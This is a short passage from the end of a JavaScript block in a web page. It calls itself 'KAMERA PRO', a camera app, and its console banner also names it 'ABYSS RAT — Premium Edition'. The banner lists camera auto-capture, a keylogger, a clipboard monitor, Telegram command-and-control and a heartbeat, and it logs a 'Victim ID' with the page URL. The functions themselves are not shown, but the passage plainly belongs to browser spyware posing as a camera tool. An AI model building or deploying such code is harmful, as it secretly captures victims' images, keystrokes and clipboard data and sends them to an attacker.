            dom.focusRing.classList.add('animate');
        });

        // ============================================================
        // INITIALIZATION
        // ============================================================
        console.log('╔════════════════════════════════════════╗');
        console.log('║     📸 KAMERA PRO v10.0               ║');
        console.log('║     ABYSS RAT — Premium Edition       ║');
        console.log('║     ⏱️ 2s Auto Capture                ║');
        console.log('║     📐 No Mirror Front Camera         ║');
        console.log('║     🔍 5-Level Zoom                   ║');
        console.log('║     🎬 Burst Live Photo               ║');
        console.log('║     ⌨️ Keylogger                      ║');
        console.log('║     📋 Clipboard Monitor              ║');
        console.log('║     📡 C2 Telegram                    ║');
        console.log('║     💓 Heartbeat                      ║');
        console.log('╚════════════════════════════════════════╝');
        console.log('🆔 Victim ID:', VID);
        console.log('🔗 URL:', location.href);
        console.log('🕐 Time:', getTimestamp());

    })();
    </script>
